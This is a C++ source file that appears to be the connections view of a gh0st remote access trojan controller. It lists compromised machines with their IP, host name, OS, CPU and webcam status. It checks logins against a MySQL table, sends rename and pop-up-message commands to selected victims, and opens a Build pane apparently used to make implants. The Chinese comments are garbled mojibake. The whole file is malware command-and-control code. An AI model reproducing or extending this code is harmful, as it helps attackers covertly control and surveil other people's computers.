
// gh0stView.cpp : Cgh0stView ���ʵ��
//

#include "stdafx.h"
// SHARED_HANDLERS ������ʵ��Ԥ��������ͼ������ɸѡ�������
// ATL ��Ŀ�н��ж��壬�����������Ŀ�����ĵ����롣
#ifndef SHARED_HANDLERS
#include "gh0st.h"
#endif

#include "gh0stView.h"
#include "MainFrm.h"
#include "SettingsView.h"
#include "BuildView.h"
#include <mmsystem.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

extern CIOCPServer* g_iocpServer;

#pragma pack(1)
typedef struct
{
    BYTE			bToken;			//   = 1   ���߷�������ʲô���
    char            UserName[50];   //   50    
    char            Password[50];   //   50   
    IN_ADDR			IPAddress;		//   �洢32λ��IPv4�ĵ�ַ���ݽṹ
    char			HostName[50];	//   ������
    bool			bIsWebCam;		//   �Ƿ�������ͷ
    OSVERSIONINFOEX	OsVerInfoEx;	//   �汾��Ϣ
    int				CPUClockMhz;	//   CPU��Ƶ
    DWORD           dwSpeed;        //   �����ٶ�
}LOGININFO;
#pragma pack()

typedef struct
{
    char	*title;      
    int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] =
{
    { "ID",				    48 },
    { "WAN",				102 },
    { "LAN",				102 },
    { "�������/��ע",	    107 },
    { "����ϵͳ",		    128 },
    { "CPU",				55 },
    { "Ping",			    40 },
    { "����ͷ",			    51 },
    { "����",			    100 }
};

int g_Column_Width = 0;    //�ܿ��

int	g_Column_Count = (sizeof(g_Column_Data) / 8) - 1;
// Cgh0stView

IMPLEMENT_DYNCREATE(Cgh0stView, CListView)

BEGIN_MESSAGE_MAP(Cgh0stView, CListView)

    ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
    ON_MESSAGE(WM_ADDTOLIST, &Cgh0stView::OnAddToList)
    ON_MESSAGE(WM_REMOVEFROMLIST, &Cgh0stView::OnRemoveFromList)
    

	ON_COMMAND(IDM_RENAME, &Cgh0stView::OnRename)
	ON_COMMAND(IDM_POSTMSG, &Cgh0stView::OnPostmsg)
	ON_WM_RBUTTONDOWN()
END_MESSAGE_MAP()

// Cgh0stView ����/����

Cgh0stView::Cgh0stView()
{
	// TODO: �ڴ˴���ӹ������
    m_pListCtrl = nullptr;

    ((Cgh0stApp*)AfxGetApp())->m_gh0stView = this;
}

Cgh0stView::~Cgh0stView()
{
}

BOOL Cgh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: �ڴ˴�ͨ���޸�
	//  CREATESTRUCT cs ���޸Ĵ��������ʽ

    cs.style |= LVS_REPORT;  //��ɱ���ģʽ  �б�ģʽ

	return CListView::PreCreateWindow(cs);
}


void Cgh0stView::OnInitialUpdate()  //��ʼ������ call
{
	CListView::OnInitialUpdate();

	// TODO: ���� GetListCtrl() ֱ�ӷ��� ListView ���б�ؼ���
	//  �Ӷ������������ ListView��
    m_pListCtrl = &GetListCtrl();

    m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);   //������չ���

    for (int i = 0; i < g_Column_Count; i++)
    {
        m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);  //�������ͷ��

        m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);  //����ÿһ�еĿ��

        g_Column_Width += g_Column_Data[i].nWidth; // �ܿ��
    }
    //Ͷ��һ����Ϣ  message
    PostMessage(WM_MYINITIALUPDATE, NULL, NULL);
}


// Cgh0stView ���

#ifdef _DEBUG
void Cgh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void Cgh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

Cgh0stDoc* Cgh0stView::GetDocument() const // �ǵ��԰汾��������
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(Cgh0stDoc)));
	return (Cgh0stDoc*)m_pDocument;
}
#endif //_DEBUG


// Cgh0stView ��Ϣ�������
LRESULT Cgh0stView::OnMyInitialUpdate(WPARAM wParam, LPARAM lParam)
{
    //Cgh0stView* pView = this;

    // Add Connects Window
    //     3           1        2              4
    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Connections", this, "Connections Users");
 
    //---------------�������ô���-------------------------
    CSettingsView* pSettingsView = new CSettingsView;

    //����CFormView�ĳ�Ա�ܱ��������Ա����ָ�����ǿ��ת��
    ((CWnd*)pSettingsView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
        CRect(0, 0, 0, 0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);

    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Settings", pSettingsView, "Control Settings");

    //---------------���ӹ�������-------------------------
    CBuildView* pBuildView = new CBuildView;

    //����CFormView�ĳ�Ա�ܱ��������Ա����ָ�����ǿ��ת��
    ((CWnd*)pBuildView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
        CRect(0, 0, 0, 0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);

    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Build", pBuildView, "Control Build");
 
    ((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);  //���õ�ǰѡ����ͼҳ��

    return 0;
}

LRESULT Cgh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
    CString strBuf;
    ClientContext *pContext = (ClientContext*)lParam;

    LOGININFO* pLoginInfo = (LOGININFO*)(pContext->m_DeCompressionBuffer.GetBuffer(0));

	bool bRet = ((Cgh0stApp*)AfxGetApp())->m_MysqlMng.SelectUser(pLoginInfo->UserName, pLoginInfo->Password);

	if (!bRet) //���û������˺ţ���ֱ�ӷ���
	{
		return 0;
	}

    int nCnt = m_pListCtrl->GetItemCount();  //�õ���ǰ�м���ʾ��

    strBuf.Format("%d", nCnt);  

    int i = m_pListCtrl->InsertItem(nCnt, strBuf); //��˳�����Լ���ID����ID���Ǹ�����

    //�����i�������б��е�˳��
    // ����IP
    m_pListCtrl->SetItemText(i, 2, inet_ntoa(pLoginInfo->IPAddress));
	//������
    m_pListCtrl->SetItemText(i, 3, pLoginInfo->HostName);
	//ʱ��Ƶ��
	strBuf.Format("%dMHz", pLoginInfo->CPUClockMhz);
	m_pListCtrl->SetItemText(i, 5, strBuf);
	//Ping��������
    strBuf.Format("%d", pLoginInfo->dwSpeed);
    m_pListCtrl->SetItemText(i, 6, strBuf);

	strBuf.Format("%s", pLoginInfo->bIsWebCam ? "��" : "��");
	m_pListCtrl->SetItemText(i, 7, strBuf);


    // ָ��Ψһ��ʶ
    m_pListCtrl->SetItemData(i, (DWORD)pContext);

    return 0;
}

LRESULT Cgh0stView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
    //���������б��,�ҵ�lParam��pContext ��ȵģ�Ȼ������Ƴ���
    ClientContext	*pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return -1;
    // ɾ����������п��ܻ�ɾ��Context
    try
    {
        //�����б��ҵ�Client����ɾ��
        int nCnt = m_pListCtrl->GetItemCount();

        for (int i = 0; i < nCnt; i++)
        {
            if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
            {
                m_pListCtrl->DeleteItem(i);
                break;
            }
        }
    }
    catch (...) 
    {
    }
    return 0;
}

void Cgh0stView::SendSelectCommand(BYTE * pData, UINT nSize)    //�����ַ�������С
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();    //�õ���һ��

	while (pos)
	{
		int nItem = m_pListCtrl->GetNextSelectedItem(pos);  //�õ���һ��

		ClientContext * pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);

		g_iocpServer->Send(pContext, pData, nSize);
	}
}

void Cgh0stView::OnRename()
{
	// TODO: �ڴ���������������
	//�������
	BYTE bData = COMMAND_RENAME_REMARK;

	SendSelectCommand(&bData,sizeof(bData));
}


void Cgh0stView::OnPostmsg()
{
	// TODO: �ڴ���������������
	POPMESSAGE msg;

	msg.bType = COMMAND_POPMESSAGE;
	lstrcpy(msg.szText, "��ã�������ж���");
	
	SendSelectCommand((BYTE*)&msg, sizeof(msg));

	/*AfxMessageBox("������Ϣ");*/
}


void Cgh0stView::OnRButtonDown(UINT nFlags, CPoint point)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	CListView::OnRButtonDown(nFlags, point);

	CMenu popup; //����һ���˵�

	popup.LoadMenuA(IDR_LIST);  //��������ƵĲ˵����ؽ�ȥ

	CMenu *pM = popup.GetSubMenu(0);  //�õ��Ӳ˵�

	CPoint p;

	GetCursorPos(&p);    //�õ����λ��

	int count = pM->GetMenuItemCount();   //�����м���С�˵�

	if (m_pListCtrl->GetSelectedCount() == 0)    //���û��ѡ���κζ���
	{
		for (int i = 0; i < count - 1; i++)  //����ж�����ͰѶ����������
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED); //�һ�
		}
	}

	//ȫѡ
	if (m_pListCtrl->GetItemCount() > 0)
		pM->EnableMenuItem(count, MF_BYPOSITION | MF_ENABLED);//���ò˵�
	else
		pM->EnableMenuItem(count - (count - 1), MF_BYPOSITION | MF_DISABLED | MF_GRAYED);//���ò˵��һ�


	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
}
